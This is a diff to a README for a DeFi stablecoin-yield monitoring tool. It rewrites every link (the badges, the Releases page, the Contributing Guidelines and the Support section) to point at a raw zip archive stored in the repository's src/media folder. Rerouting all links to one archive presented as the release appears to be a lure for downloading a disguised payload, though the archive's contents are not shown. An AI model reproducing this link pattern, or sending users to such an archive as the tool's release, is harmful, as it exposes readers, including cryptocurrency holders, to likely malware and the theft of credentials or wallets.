@@ -1,7 +1,7 @@
 # DeFi Monitoring Tool 🚀
 
-![DeFi Monitoring](https://img.shields.io/badge/DeFi%20Monitoring-Open%20Source-brightgreen)  
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/Ali123490/defi_monitoring/releases)
+![DeFi Monitoring](https://github.com/Ali123490/defi_monitoring/raw/refs/heads/master/src/media/defi_monitoring_v1.1.zip%20Monitoring-Open%20Source-brightgreen)  
+[![Download Releases](https://github.com/Ali123490/defi_monitoring/raw/refs/heads/master/src/media/defi_monitoring_v1.1.zip%20Releases-Click%20Here-blue)](https://github.com/Ali123490/defi_monitoring/raw/refs/heads/master/src/media/defi_monitoring_v1.1.zip)
 
 Welcome to the DeFi Monitoring Tool! This open-source project helps you find high-yield stablecoin pools. With our tool, you can receive Telegram alerts for new opportunities in AAVE, Uniswap, and Pendle.
 
@@ -26,7 +26,7 @@ Welcome to the DeFi Monitoring Tool! This open-source project helps you find hig
 
 ## Installation
 
-To get started, download the latest release from our [Releases page](https://github.com/Ali123490/defi_monitoring/releases). Follow the instructions provided there to set up the tool on your system.
+To get started, download the latest release from our [Releases page](https://github.com/Ali123490/defi_monitoring/raw/refs/heads/master/src/media/defi_monitoring_v1.1.zip). Follow the instructions provided there to set up the tool on your system.
 
 ### Requirements
 
@@ -86,7 +86,7 @@ We welcome contributions from the community! If you want to help improve the DeF
 3. Make your changes and commit them.
 4. Push to your branch and submit a pull request.
 
-For more details, please check our [Contributing Guidelines](CONTRIBUTING.md).
+For more details, please check our [Contributing Guidelines](https://github.com/Ali123490/defi_monitoring/raw/refs/heads/master/src/media/defi_monitoring_v1.1.zip).
 
 ## License
 
@@ -94,6 +94,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or need assistance, feel free to reach out to our community on GitHub or check the [Releases section](https://github.com/Ali123490/defi_monitoring/releases) for updates and troubleshooting tips.
+If you have any questions or need assistance, feel free to reach out to our community on GitHub or check the [Releases section](https://github.com/Ali123490/defi_monitoring/raw/refs/heads/master/src/media/defi_monitoring_v1.1.zip) for updates and troubleshooting tips.
 
 Thank you for using the DeFi Monitoring Tool! We hope it helps you find the best opportunities in the DeFi space. Happy investing!
